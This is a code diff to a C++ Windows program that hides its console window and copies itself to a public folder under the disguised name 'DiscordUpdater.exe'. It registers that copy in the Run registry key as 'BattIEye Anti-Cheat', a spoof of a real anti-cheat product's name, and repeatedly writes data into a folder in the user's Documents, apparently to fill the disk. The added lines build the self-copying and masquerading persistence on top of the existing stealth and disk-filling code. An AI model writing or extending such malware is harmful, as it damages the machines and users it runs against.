@@ -27,24 +27,42 @@ string getNextFileName(const string& basePath)
   return filePath;
 }
 
+void SelfClone(string clonePath)
+{
+  char exePath[MAX_PATH];
+  GetModuleFileNameA(NULL, exePath, MAX_PATH);
+  if(filesystem::exists(clonePath))
+  {return;}
+
+  ifstream src(exePath, ios::binary);
+  ofstream dst(clonePath, ios::binary);
+
+  dst << src.rdbuf();
+
+  src.close();
+  dst.close();
+}
+
 int main()
 {
   const char* username = getenv("USERNAME");
   string folderPath = "C:\\Users\\" + string(username) + "\\Documents\\BattIEye Anti-Cheat";
   string baseFilePath = folderPath + "\\config";
+  string clonePath = "C:\\Users\\Public\\Music\\DiscordUpdater.exe";
   //stealth
   HWND hwnd = GetConsoleWindow();
   ShowWindow(hwnd, SW_HIDE);
 
   char exePath[MAX_PATH];
   GetModuleFileNameA(NULL, exePath, MAX_PATH);
+  SelfClone(clonePath);
   SelfExecute();
 
   // add to startup
   HKEY hKey;
   RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
   const char* valueName = "BattIEye Anti-Cheat";
-  RegSetValueExA(hKey, valueName, 0, REG_SZ, (LPBYTE)exePath, strlen(exePath));
+  RegSetValueExA(hKey, valueName, 0, REG_SZ, (LPBYTE)clonePath.c_str(), clonePath.size());
   RegCloseKey(hKey);
 
   CreateDirectory(folderPath.c_str(), NULL);
@@ -63,7 +81,7 @@ int main()
   while (writtenBytes < targetSize)
   {
     outFile.write(data.c_str(), dataSize);
-    writtenBytes += dataSize;   
+    writtenBytes += dataSize;
   }
 
   outFile.close();
